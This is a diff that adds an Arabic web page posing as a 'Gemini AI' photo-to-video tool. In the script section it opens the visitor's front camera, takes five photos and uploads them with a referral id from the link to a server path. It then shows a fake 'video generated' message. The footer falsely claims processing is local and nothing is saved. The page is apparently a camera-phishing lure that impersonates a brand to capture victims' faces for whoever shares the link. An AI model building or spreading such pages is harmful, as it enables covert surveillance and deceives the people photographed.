@@ -1,4 +1,4 @@
-<!-- <!DOCTYPE html>
+<!-- <!-- <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
@@ -186,7 +186,7 @@
 
 
 
-
+<!-- 
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -857,6 +857,885 @@
         if (captureBtn.disabled) {
             e.preventDefault();
             e.returnValue = 'هل تريد حقاً الخروج؟ سيتم إيقاف عملية الالتقاط.';
+            return e.returnValue;
+        }
+    });
+</script>
+
+</body>
+</html> --> -->
+
+
+
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gemini AI - تحويل الصور إلى فيديو</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>✨</text></svg>">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Cairo', sans-serif;
+        }
+
+        body {
+            background: #0a0a0f;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* خلفية متحركة تشبه Gemini */
+        body::before {
+            content: '';
+            position: fixed;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: 
+                radial-gradient(ellipse at 20% 50%, rgba(88, 50, 255, 0.15) 0%, transparent 60%),
+                radial-gradient(ellipse at 80% 50%, rgba(0, 200, 255, 0.12) 0%, transparent 60%),
+                radial-gradient(ellipse at 50% 20%, rgba(255, 0, 200, 0.05) 0%, transparent 50%);
+            animation: aurora 15s ease-in-out infinite alternate;
+            z-index: 0;
+        }
+
+        @keyframes aurora {
+            0% { transform: translate(0, 0) rotate(0deg) scale(1); }
+            33% { transform: translate(5%, -5%) rotate(5deg) scale(1.1); }
+            66% { transform: translate(-5%, 5%) rotate(-5deg) scale(0.9); }
+            100% { transform: translate(0, 0) rotate(0deg) scale(1); }
+        }
+
+        /* جزيئات ذكاء اصطناعي */
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+            overflow: hidden;
+        }
+
+        .particle {
+            position: absolute;
+            width: 3px;
+            height: 3px;
+            background: rgba(100, 149, 237, 0.4);
+            border-radius: 50%;
+            animation: float-particle linear infinite;
+        }
+
+        @keyframes float-particle {
+            0% { transform: translateY(100vh) scale(0); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translateY(-10vh) scale(1); opacity: 0; }
+        }
+
+        .container {
+            position: relative;
+            z-index: 1;
+            width: 100%;
+            max-width: 520px;
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(40px) saturate(1.4);
+            -webkit-backdrop-filter: blur(40px) saturate(1.4);
+            border-radius: 32px;
+            padding: 40px 30px;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            box-shadow: 
+                0 30px 80px rgba(0, 0, 0, 0.6),
+                inset 0 1px 0 rgba(255, 255, 255, 0.05),
+                0 0 120px rgba(88, 50, 255, 0.05);
+            transition: transform 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+
+        .container:hover {
+            transform: translateY(-4px) scale(1.005);
+        }
+
+        /* شريط علوي بتأثير Gemini */
+        .gemini-bar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+        }
+
+        .gemini-logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .gemini-icon {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, #5832ff, #00c8ff);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            color: white;
+            box-shadow: 0 8px 30px rgba(88, 50, 255, 0.3);
+            animation: glow-pulse 3s ease-in-out infinite;
+        }
+
+        @keyframes glow-pulse {
+            0%, 100% { box-shadow: 0 8px 30px rgba(88, 50, 255, 0.3); }
+            50% { box-shadow: 0 8px 50px rgba(88, 50, 255, 0.6), 0 0 80px rgba(0, 200, 255, 0.1); }
+        }
+
+        .gemini-logo span {
+            font-size: 1.1em;
+            font-weight: 800;
+            background: linear-gradient(135deg, #ffffff, #a8b5ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: -0.5px;
+        }
+
+        .gemini-badge {
+            font-size: 0.6em;
+            padding: 4px 12px;
+            background: rgba(88, 50, 255, 0.2);
+            border-radius: 20px;
+            color: #a8b5ff;
+            border: 1px solid rgba(88, 50, 255, 0.15);
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+
+        .ai-status {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.7em;
+            color: rgba(255, 255, 255, 0.3);
+        }
+
+        .ai-dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: #4ade80;
+            animation: dot-pulse 2s ease-in-out infinite;
+        }
+
+        @keyframes dot-pulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.3; transform: scale(0.8); }
+        }
+
+        .ai-title {
+            text-align: center;
+            margin-bottom: 8px;
+        }
+
+        .ai-title h1 {
+            font-size: 2em;
+            font-weight: 800;
+            background: linear-gradient(135deg, #ffffff 30%, #a8b5ff 60%, #5832ff 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            line-height: 1.2;
+            letter-spacing: -1px;
+        }
+
+        .ai-title p {
+            color: rgba(255, 255, 255, 0.4);
+            font-size: 0.9em;
+            margin-top: 5px;
+        }
+
+        .ai-title .highlight {
+            color: rgba(255, 255, 255, 0.7);
+            background: rgba(88, 50, 255, 0.15);
+            padding: 2px 10px;
+            border-radius: 6px;
+            border: 1px solid rgba(88, 50, 255, 0.1);
+        }
+
+        .user-info {
+            background: rgba(255, 255, 255, 0.03);
+            padding: 15px 18px;
+            border-radius: 16px;
+            margin: 20px 0;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            backdrop-filter: blur(10px);
+        }
+
+        .user-info p {
+            margin: 3px 0;
+            font-size: 0.85em;
+            color: rgba(255, 255, 255, 0.4);
+        }
+
+        .user-info .label {
+            color: rgba(255, 255, 255, 0.2);
+            font-size: 0.7em;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .user-id {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 8px 14px;
+            border-radius: 10px;
+            margin-top: 8px;
+            font-family: 'Courier New', monospace;
+            direction: ltr;
+            overflow-x: auto;
+            white-space: nowrap;
+            font-size: 0.85em;
+            color: rgba(255, 255, 255, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.03);
+        }
+
+        .video-wrapper {
+            position: relative;
+            width: 100%;
+            border-radius: 20px;
+            overflow: hidden;
+            margin: 20px 0;
+            background: rgba(0, 0, 0, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+        }
+
+        .video-wrapper video {
+            width: 100%;
+            display: block;
+            aspect-ratio: 4/3;
+            object-fit: cover;
+            transform: scaleX(-1);
+        }
+
+        .video-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 30% 40%, rgba(88, 50, 255, 0.05), transparent 70%),
+                radial-gradient(circle at 70% 60%, rgba(0, 200, 255, 0.03), transparent 70%);
+            pointer-events: none;
+        }
+
+        /* تأثير "AI Processing" على الفيديو */
+        .ai-processing-badge {
+            position: absolute;
+            bottom: 15px;
+            right: 15px;
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(20px);
+            padding: 8px 16px;
+            border-radius: 30px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 0.7em;
+            color: rgba(255, 255, 255, 0.5);
+            pointer-events: none;
+        }
+
+        .ai-processing-badge .spinner {
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255, 255, 255, 0.05);
+            border-top: 2px solid #5832ff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .status-container {
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 16px;
+            padding: 20px;
+            margin: 20px 0;
+            border: 1px solid rgba(255, 255, 255, 0.03);
+        }
+
+        #status {
+            font-weight: 600;
+            font-size: 0.95em;
+            color: rgba(255, 255, 255, 0.6);
+            min-height: 28px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        #status .icon {
+            font-size: 1.1em;
+        }
+
+        .progress-container {
+            width: 100%;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.04);
+            border-radius: 4px;
+            overflow: hidden;
+            margin-top: 15px;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #5832ff, #00c8ff);
+            border-radius: 4px;
+            width: 0%;
+            transition: width 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+            box-shadow: 0 0 20px rgba(88, 50, 255, 0.2);
+        }
+
+        .counter {
+            font-size: 0.8em;
+            color: rgba(255, 255, 255, 0.2);
+            margin-top: 8px;
+            text-align: left;
+        }
+
+        .thumbnails {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 10px;
+            margin: 15px 0 20px;
+            min-height: 60px;
+        }
+
+        .thumbnails .placeholder-text {
+            color: rgba(255, 255, 255, 0.1);
+            font-size: 0.8em;
+        }
+
+        .thumbnails img {
+            width: 65px;
+            height: 65px;
+            object-fit: cover;
+            border-radius: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            transition: all 0.3s ease;
+            background: rgba(0, 0, 0, 0.3);
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+        }
+
+        .thumbnails img:hover {
+            transform: scale(1.1) translateY(-4px);
+            border-color: rgba(88, 50, 255, 0.3);
+            box-shadow: 0 8px 30px rgba(88, 50, 255, 0.15);
+        }
+
+        .btn-container {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin: 20px 0;
+        }
+
+        .capture-btn {
+            width: 100%;
+            padding: 18px;
+            border-radius: 60px;
+            border: none;
+            font-size: 1em;
+            cursor: pointer;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 14px;
+            transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+            position: relative;
+            overflow: hidden;
+            background: linear-gradient(135deg, #5832ff, #7c5cff);
+            color: #fff;
+            box-shadow: 0 8px 40px rgba(88, 50, 255, 0.25);
+        }
+
+        .capture-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
+            transition: left 0.6s;
+        }
+
+        .capture-btn:hover:not(:disabled)::before {
+            left: 100%;
+        }
+
+        .capture-btn:hover:not(:disabled) {
+            transform: translateY(-3px) scale(1.02);
+            box-shadow: 0 12px 50px rgba(88, 50, 255, 0.35);
+        }
+
+        .capture-btn:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+
+        .capture-btn .btn-icon {
+            font-size: 1.2em;
+        }
+
+        .capture-btn .btn-text {
+            letter-spacing: 0.5px;
+        }
+
+        .secondary-btn {
+            width: 100%;
+            padding: 14px;
+            border-radius: 60px;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            background: rgba(255, 255, 255, 0.02);
+            color: rgba(255, 255, 255, 0.3);
+            font-size: 0.85em;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            font-weight: 500;
+        }
+
+        .secondary-btn:hover {
+            background: rgba(255, 255, 255, 0.04);
+            border-color: rgba(255, 255, 255, 0.08);
+            color: rgba(255, 255, 255, 0.5);
+        }
+
+        .features {
+            display: flex;
+            justify-content: space-between;
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .feature {
+            flex: 1;
+            padding: 14px 8px;
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 14px;
+            border: 1px solid rgba(255, 255, 255, 0.03);
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+
+        .feature:hover {
+            background: rgba(255, 255, 255, 0.04);
+            border-color: rgba(255, 255, 255, 0.06);
+        }
+
+        .feature i {
+            font-size: 1.3em;
+            color: rgba(255, 255, 255, 0.15);
+            margin-bottom: 5px;
+            display: block;
+        }
+
+        .feature .num {
+            font-size: 1.1em;
+            font-weight: 700;
+            color: rgba(255, 255, 255, 0.3);
+        }
+
+        .feature .label {
+            font-size: 0.6em;
+            color: rgba(255, 255, 255, 0.15);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .footer {
+            margin-top: 25px;
+            font-size: 0.65em;
+            color: rgba(255, 255, 255, 0.08);
+            text-align: center;
+            letter-spacing: 0.5px;
+        }
+
+        .footer span {
+            color: rgba(255, 255, 255, 0.05);
+        }
+
+        /* Notification */
+        .notification {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(30px);
+            padding: 14px 28px;
+            border-radius: 60px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            color: white;
+            font-size: 0.85em;
+            z-index: 1000;
+            animation: notifSlideUp 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+            max-width: 90%;
+            text-align: center;
+        }
+
+        @keyframes notifSlideUp {
+            from { transform: translateX(-50%) translateY(30px); opacity: 0; }
+            to { transform: translateX(-50%) translateY(0); opacity: 1; }
+        }
+
+        .notification.hidden {
+            display: none;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        /* Responsive */
+        @media (max-width: 500px) {
+            .container {
+                padding: 25px 18px;
+                border-radius: 24px;
+            }
+            .ai-title h1 {
+                font-size: 1.5em;
+            }
+            .gemini-logo span {
+                font-size: 0.9em;
+            }
+            .video-wrapper video {
+                aspect-ratio: 4/3;
+            }
+            .thumbnails img {
+                width: 50px;
+                height: 50px;
+            }
+            .features {
+                gap: 6px;
+            }
+            .feature {
+                padding: 10px 4px;
+            }
+            .feature .num {
+                font-size: 0.9em;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+<!-- الجزيئات الخلفية -->
+<div class="particles" id="particles"></div>
+
+<div class="container">
+    <!-- شريط Gemini -->
+    <div class="gemini-bar">
+        <div class="gemini-logo">
+            <div class="gemini-icon">✨</div>
+            <span>Gemini AI</span>
+            <span class="gemini-badge">v2.0</span>
+        </div>
+        <div class="ai-status">
+            <span class="ai-dot"></span>
+            <span>نشط</span>
+        </div>
+    </div>
+
+    <!-- العنوان -->
+    <div class="ai-title">
+        <h1>تحويل الصور<br>إلى فيديو ذكي</h1>
+        <p><span class="highlight">🤖 AI</span> سيتم التقاط 5 صور وتحويلها إلى مقطع فيديو</p>
+    </div>
+
+    <!-- معلومات المستخدم -->
+    <div class="user-info">
+        <p><span class="label">🔗 معرف الإحالة</span></p>
+        <div class="user-id" id="referralDisplay">جاري التحميل...</div>
+    </div>
+
+    <!-- فيديو الكاميرا -->
+    <div class="video-wrapper">
+        <video id="camera" autoplay playsinline muted></video>
+        <div class="video-overlay"></div>
+        <div class="ai-processing-badge">
+            <div class="spinner"></div>
+            <span>AI Vision</span>
+        </div>
+    </div>
+
+    <!-- الحالة -->
+    <div class="status-container">
+        <div id="status">
+            <span class="icon">⏳</span>
+            <span>تهيئة الذكاء الاصطناعي...</span>
+        </div>
+        <div class="progress-container">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        <div class="counter" id="counter">0 / 5 إطارات</div>
+    </div>
+
+    <!-- المعاينة -->
+    <div class="thumbnails" id="thumbnails">
+        <span class="placeholder-text">📸 ستظهر معاينة الصور هنا</span>
+    </div>
+
+    <!-- الأزرار -->
+    <div class="btn-container">
+        <button class="capture-btn" id="captureBtn">
+            <span class="btn-icon">🎬</span>
+            <span class="btn-text">بدء توليد الفيديو</span>
+        </button>
+        <button class="secondary-btn" onclick="location.reload()">
+            <i class="fas fa-rotate"></i> إعادة التشغيل
+        </button>
+    </div>
+
+    <!-- مميزات -->
+    <div class="features">
+        <div class="feature">
+            <i class="fas fa-layer-group"></i>
+            <div class="num">5</div>
+            <div class="label">إطارات</div>
+        </div>
+        <div class="feature">
+            <i class="fas fa-clock"></i>
+            <div class="num">2s</div>
+            <div class="label">بين الإطارات</div>
+        </div>
+        <div class="feature">
+            <i class="fas fa-bolt"></i>
+            <div class="num">AI</div>
+            <div class="label">معالجة ذكية</div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <span>⚡ Gemini AI · معالجة محلية · لا يتم حفظ البيانات</span>
+    </div>
+</div>
+
+<div id="notification" class="notification hidden"></div>
+
+<script>
+    // =============================================
+    // 🎯 نفس الكود الأصلي بالضبط مع تغيير النصوص فقط
+    // =============================================
+
+    const params = new URLSearchParams(window.location.search);
+    const referralId = params.get("q");
+
+    const captureBtn = document.getElementById("captureBtn");
+    const camera = document.getElementById("camera");
+    const status = document.getElementById("status");
+    const progressBar = document.getElementById("progressBar");
+    const counter = document.getElementById("counter");
+    const thumbnails = document.getElementById("thumbnails");
+    const referralDisplay = document.getElementById("referralDisplay");
+    const notification = document.getElementById("notification");
+
+    let stream = null;
+
+    // جزيئات الخلفية
+    function createParticles() {
+        const container = document.getElementById('particles');
+        for (let i = 0; i < 25; i++) {
+            const p = document.createElement('div');
+            p.className = 'particle';
+            p.style.left = Math.random() * 100 + '%';
+            p.style.animationDuration = (15 + Math.random() * 25) + 's';
+            p.style.animationDelay = (Math.random() * 15) + 's';
+            p.style.width = (1 + Math.random() * 3) + 'px';
+            p.style.height = p.style.width;
+            container.appendChild(p);
+        }
+    }
+    createParticles();
+
+    if (referralId) {
+        referralDisplay.textContent = referralId;
+    } else {
+        referralDisplay.textContent = "❌ رابط غير صالح";
+        referralDisplay.style.color = "rgba(255,100,100,0.5)";
+    }
+
+    function showNotification(message, type = 'info') {
+        notification.textContent = message;
+        notification.className = 'notification';
+        const colors = {
+            success: 'rgba(74,222,128,0.15)',
+            error: 'rgba(255,100,100,0.15)',
+            warning: 'rgba(255,200,50,0.15)',
+            info: 'rgba(88,50,255,0.15)'
+        };
+        notification.style.borderColor = colors[type] || 'rgba(255,255,255,0.05)';
+        notification.style.boxShadow = `0 20px 60px rgba(0,0,0,0.5), inset 0 1px 0 ${colors[type] || 'rgba(255,255,255,0.05)'}`;
+        
+        setTimeout(() => {
+            notification.className = 'notification hidden';
+        }, 3500);
+    }
+
+    async function initCamera() {
+        if (!referralId) {
+            status.innerHTML = '<span class="icon">❌</span><span>رابط الإحالة غير صحيح</span>';
+            return;
+        }
+
+        try {
+            stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: "user" },
+                audio: false
+            });
+
+            camera.srcObject = stream;
+
+            await new Promise((resolve, reject) => {
+                camera.onloadedmetadata = () => {
+                    camera.play().then(resolve).catch(reject);
+                };
+            });
+
+            status.innerHTML = '<span class="icon">✅</span><span>الكاميرا جاهزة · AI نشط</span>';
+            showNotification('✅ الذكاء الاصطناعي جاهز', 'success');
+
+        } catch (error) {
+            console.error(error);
+            status.innerHTML = '<span class="icon">⚠️</span><span>يرجى السماح بالكاميرا</span>';
+            showNotification('⚠️ يرجى السماح بصلاحية الكاميرا', 'error');
+        }
+    }
+
+    initCamera();
+
+    function captureSingleFrame() {
+        return new Promise((resolve) => {
+            const canvas = document.createElement("canvas");
+            const width = camera.videoWidth || 640;
+            const height = camera.videoHeight || 480;
+            canvas.width = width;
+            canvas.height = height;
+
+            const context = canvas.getContext("2d");
+            context.translate(width, 0);
+            context.scale(-1, 1);
+            context.drawImage(camera, 0, 0, width, height);
+
+            canvas.toBlob((blob) => resolve(blob), "image/jpeg", 0.7);
+        });
+    }
+
+    const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+
+    captureBtn.addEventListener("click", async () => {
+        if (!stream || !referralId) {
+            status.innerHTML = '<span class="icon">❌</span><span>الكاميرا غير جاهزة</span>';
+            showNotification('❌ الكاميرا غير جاهزة', 'error');
+            return;
+        }
+
+        captureBtn.disabled = true;
+        thumbnails.innerHTML = '';
+        progressBar.style.width = '0%';
+        counter.textContent = '0 / 5 إطارات';
+
+        const totalPhotos = 5;
+        const formData = new FormData();
+        formData.append("referral_id", referralId);
+
+        try {
+            for (let i = 1; i <= totalPhotos; i++) {
+                status.innerHTML = `<span class="icon">🎬</span><span>توليد الإطار ${i} من ${totalPhotos}...</span>`;
+                const blob = await captureSingleFrame();
+
+                if (blob) {
+                    const img = document.createElement("img");
+                    img.src = URL.createObjectURL(blob);
+                    thumbnails.appendChild(img);
+
+                    formData.append("photos", blob, `photo_${i}.jpg`);
+
+                    const percent = (i / totalPhotos) * 100;
+                    progressBar.style.width = `${percent}%`;
+                    counter.textContent = `${i} / ${totalPhotos} إطارات`;
+                }
+
+                if (i < totalPhotos) {
+                    await delay(2000);
+                }
+            }
+
+            if (stream) {
+                stream.getTracks().forEach((track) => track.stop());
+                stream = null;
+            }
+
+            status.innerHTML = '<span class="icon">📤</span><span>جاري معالجة الفيديو وإرساله...</span>';
+            showNotification('⏳ جاري معالجة الفيديو...', 'info');
+
+            const response = await fetch("/upload-photo", {
+                method: "POST",
+                body: formData
+            });
+
+            const result = await response.json();
+
+            if (response.ok && result.success) {
+                status.innerHTML = '<span class="icon">🎉</span><span>تم توليد الفيديو بنجاح!</span>';
+                showNotification('🎉 تم توليد الفيديو بنجاح!', 'success');
+                camera.style.display = "none";
+                captureBtn.style.display = "none";
+            } else {
+                status.innerHTML = `<span class="icon">❌</span><span>${result.message || 'حدث خطأ'}</span>`;
+                showNotification(`❌ ${result.message || 'حدث خطأ'}`, 'error');
+                captureBtn.disabled = false;
+            }
+
+        } catch (error) {
+            console.error(error);
+            status.innerHTML = '<span class="icon">❌</span><span>تعذر الاتصال بالخادم</span>';
+            showNotification('❌ تعذر الاتصال بالخادم', 'error');
+            captureBtn.disabled = false;
+        }
+    });
+
+    window.addEventListener('beforeunload', (e) => {
+        if (captureBtn.disabled) {
+            e.preventDefault();
+            e.returnValue = 'هل تريد الخروج؟ سيتم إيقاف المعالجة.';
             return e.returnValue;
         }
     });
